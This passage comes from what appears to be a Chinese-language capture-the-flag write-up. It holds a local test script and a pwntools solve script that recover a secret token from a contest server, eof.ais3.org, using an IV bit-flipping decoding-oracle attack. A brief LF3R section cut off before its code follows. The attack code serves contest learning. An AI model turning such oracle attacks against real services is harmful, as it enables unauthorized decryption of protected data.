</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># localtest.py</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Cipher <span style=color:#f92672>import</span> AES
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> hashlib <span style=color:#f92672>import</span> sha256
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>FLAG <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;FLAG</span><span style=color:#e6db74>{adnajdlkawjlefjle}</span><span style=color:#e6db74>&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>token <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>urandom(<span style=color:#ae81ff>8</span>)
</span></span><span style=display:flex><span>iv <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>urandom(<span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>key <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>urandom(<span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>cipher <span style=color:#f92672>=</span> AES<span style=color:#f92672>.</span>new(key, AES<span style=color:#f92672>.</span>MODE_CBC, iv<span style=color:#f92672>=</span>iv)
</span></span><span style=display:flex><span>print(iv<span style=color:#f92672>.</span>hex() <span style=color:#f92672>+</span> cipher<span style=color:#f92672>.</span>encrypt(token<span style=color:#f92672>.</span>hex()<span style=color:#f92672>.</span>encode())<span style=color:#f92672>.</span>hex())
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;Hint: &#34;</span>, sha256(token)<span style=color:#f92672>.</span>hexdigest())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>cipher <span style=color:#f92672>=</span> AES<span style=color:#f92672>.</span>new(key, AES<span style=color:#f92672>.</span>MODE_CBC, iv<span style=color:#f92672>=</span>iv)
</span></span><span style=display:flex><span>ct <span style=color:#f92672>=</span> cipher<span style=color:#f92672>.</span>encrypt(token<span style=color:#f92672>.</span>hex()<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(iv, ct)
</span></span><span style=display:flex><span>cipher <span style=color:#f92672>=</span> AES<span style=color:#f92672>.</span>new(key, AES<span style=color:#f92672>.</span>MODE_CBC, iv<span style=color:#f92672>=</span>iv)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>m <span style=color:#f92672>=</span> cipher<span style=color:#f92672>.</span>decrypt(ct)<span style=color:#f92672>.</span>decode()
</span></span><span style=display:flex><span>print(m)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>goodchr <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;1234567890abcdefABCDEF&#39;</span>
</span></span><span style=display:flex><span>mp <span style=color:#f92672>=</span> {}
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> goodchr:
</span></span><span style=display:flex><span>    mp[ str(sorted([ord(c) <span style=color:#f92672>^</span> ord(d) <span style=color:#66d9ef>for</span> d <span style=color:#f92672>in</span> goodchr])) ] <span style=color:#f92672>=</span> c
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>an <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> j <span style=color:#f92672>in</span> reversed(range(<span style=color:#ae81ff>16</span>)):
</span></span><span style=display:flex><span>    possible <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>128</span>):
</span></span><span style=display:flex><span>        inp <span style=color:#f92672>=</span> iv[:j] <span style=color:#f92672>+</span> bytes([c <span style=color:#f92672>^</span> iv[j]]) <span style=color:#f92672>+</span> iv[j<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>:] <span style=color:#f92672>+</span> ct
</span></span><span style=display:flex><span>        <span style=color:#75715e># ct[:14] + bytes([c, d]) + suffix</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        cipher <span style=color:#f92672>=</span> AES<span style=color:#f92672>.</span>new(key, AES<span style=color:#f92672>.</span>MODE_CBC, iv<span style=color:#f92672>=</span>inp[:<span style=color:#ae81ff>16</span>])
</span></span><span style=display:flex><span>        m <span style=color:#f92672>=</span> cipher<span style=color:#f92672>.</span>decrypt(inp[<span style=color:#ae81ff>16</span>:])
</span></span><span style=display:flex><span>        m <span style=color:#f92672>=</span> m<span style=color:#f92672>.</span>decode()
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>            <span style=color:#75715e># orgm = m</span>
</span></span><span style=display:flex><span>            m <span style=color:#f92672>=</span> bytes<span style=color:#f92672>.</span>fromhex(m)
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>&#34;Well received&#34;</span>)
</span></span><span style=display:flex><span>            <span style=color:#75715e># print(orgm[-1])</span>
</span></span><span style=display:flex><span>            possible<span style=color:#f92672>.</span>append(c)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>except</span>:
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>&#34;Invalid&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    c <span style=color:#f92672>=</span> mp[str(possible)]
</span></span><span style=display:flex><span>    an <span style=color:#f92672>+=</span> c
</span></span><span style=display:flex><span>    print(c)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(list(reversed(an))))
</span></span><span style=display:flex><span>exit(<span style=color:#ae81ff>0</span>)
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">56
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># solve.py</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> tqdm <span style=color:#f92672>import</span> tqdm
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># context.log_level = &#39;debug&#39;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># r = process([&#39;python&#39;, &#39;./chal.py&#39;])</span>
</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;eof.ais3.org&#39;</span>, <span style=color:#ae81ff>10050</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>goodchr <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;1234567890abcdefABCDEF&#39;</span>
</span></span><span style=display:flex><span>mp <span style=color:#f92672>=</span> {}
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> goodchr:
</span></span><span style=display:flex><span>    mp[ str(sorted([ord(c) <span style=color:#f92672>^</span> ord(d) <span style=color:#66d9ef>for</span> d <span style=color:#f92672>in</span> goodchr])) ] <span style=color:#f92672>=</span> c
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>L <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>recvline()
</span></span><span style=display:flex><span>print(L)
</span></span><span style=display:flex><span>inp <span style=color:#f92672>=</span> bytes<span style=color:#f92672>.</span>fromhex(L<span style=color:#f92672>.</span>strip()<span style=color:#f92672>.</span>decode())
</span></span><span style=display:flex><span>print(r<span style=color:#f92672>.</span>recvline())
</span></span><span style=display:flex><span>iv, ct <span style=color:#f92672>=</span> inp[:<span style=color:#ae81ff>16</span>], inp[<span style=color:#ae81ff>16</span>:]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(iv, ct)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>ask</span>(msg):
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvline()
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvline()
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvline()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Message(hex): &#39;</span>, bytes(msg<span style=color:#f92672>.</span>hex() <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>, <span style=color:#e6db74>&#39;ascii&#39;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Well&#39;</span> <span style=color:#f92672>in</span> r<span style=color:#f92672>.</span>recvline()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ans <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> j <span style=color:#f92672>in</span> tqdm(range(<span style=color:#ae81ff>16</span>)):
</span></span><span style=display:flex><span>    possible <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>128</span>):
</span></span><span style=display:flex><span>        inp <span style=color:#f92672>=</span> iv[:j] <span style=color:#f92672>+</span> bytes([c <span style=color:#f92672>^</span> iv[j]]) <span style=color:#f92672>+</span> iv[j<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>:] <span style=color:#f92672>+</span> ct
</span></span><span style=display:flex><span>        <span style=color:#75715e># ct[:14] + bytes([c, d]) + suffix</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ask(inp):
</span></span><span style=display:flex><span>            possible<span style=color:#f92672>.</span>append(c)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    c <span style=color:#f92672>=</span> mp[str(possible)]
</span></span><span style=display:flex><span>    ans <span style=color:#f92672>+=</span> c
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(ans)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>recvline()
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>recvline()
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>recvline()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;2&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Token(hex): &#39;</span>, bytes(ans <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>, <span style=color:#e6db74>&#39;ascii&#39;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(r<span style=color:#f92672>.</span>recv())
</span></span></code></pre></td></tr></table></div></div><p>不要 XOR 太大的數字或是修改 <code>ct</code>，不然直接不能被 utf-8 decode 就會斷線。</p><h3 id=lf3r>LF3R</h3><p>題目給了很像線性遞迴的東西，然後他的確是線性遞迴。<br>用 BerlekampMassey 就解開ㄌ</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 51
